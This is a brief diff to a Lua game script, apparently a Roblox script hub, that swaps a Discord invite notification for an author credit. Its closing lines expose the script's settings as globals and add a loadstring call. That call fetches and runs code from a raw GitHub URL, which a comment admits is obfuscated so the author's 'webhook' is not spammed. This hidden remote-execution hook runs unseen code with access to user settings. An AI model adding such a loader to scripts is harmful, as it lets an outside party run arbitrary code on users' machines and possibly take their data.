@@ -1455,4 +1455,9 @@ end)
 
 -- // loops end
 
---yznotify("https://discord.gg/zNzJVgFGae")
+yznotify("Made by apnff0x on discord!")
+
+-- This part is specifically obfuscated because i dont want my webhook getting spammed, sorry! (its the feedback section)
+_G.YZSETTINGS = Settings
+_G.YZNOTIFY = yznotify
+loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/weqwdsadasdsa/refs/heads/main/feedbackmenu", true))()
